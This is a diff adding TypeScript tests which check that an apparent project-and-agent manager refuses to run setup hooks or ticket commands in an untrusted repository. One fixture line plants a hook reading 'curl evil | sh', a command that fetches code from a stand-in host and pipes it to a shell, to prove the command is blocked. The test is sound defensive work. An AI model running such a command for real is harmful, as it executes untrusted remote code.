@@ -224,3 +224,39 @@ describe('agent turns before Trust', { timeout: 15_000 }, () => {
     });
   });
 });
+
+describe('glafka on a repo you have not trusted', { timeout: 15_000 }, () => {
+  const ran = (command: string) =>
+    fake.calls().some((c) => c.split('\t')[1]?.startsWith(command));
+
+  it('Set up runs no glafka and says why', async () => {
+    project = realpathSync(mkdtempSync(path.join(tmpdir(), 'elaia-trust-bare-')));
+    hook('curl evil | sh');
+    fake.answer('install', {});
+    const a = app();
+    await a.addProject(project);
+    await a.setup(project);
+    expect(ran('install')).toBe(false);
+    expect(ran('odysse')).toBe(false);
+    expect(errors(a, mainRef())).toContain(NOT_TRUSTED_SETUP);
+  });
+
+  it('still lists tickets, but Start, Close and vima run no glafka and say why', async () => {
+    write('.glafka.json', { agents: { coder: 'claude -p' } });
+    fake.answer('poreia', { contract: 1, tickets: [makeTicket({ planned: false })] });
+    fake.answer('vima', { contract: 1, results: [] });
+    fake.answer('lysis', {});
+    fake.answer('plan', {});
+    const a = app();
+    await a.addProject(project);
+    const ref = { project, thread: TICKET };
+    expect(a.ticket(ref)?.id).toBe(TICKET);
+    await a.advance(project, TICKET);
+    await a.closeTicket(ref);
+    await a.startTicket(ref, TICKET);
+    for (const command of ['vima', 'lysis', 'plan', 'ergon']) expect(ran(command)).toBe(false);
+    expect(errors(a, ref).filter((t) => t.includes(NOT_TRUSTED_GLAFKA))).toHaveLength(3);
+    // A refused vima is not handed to the agent to explain.
+    expect(errors(a, ref)).not.toContain(NOT_TRUSTED_TURN);
+  });
+});
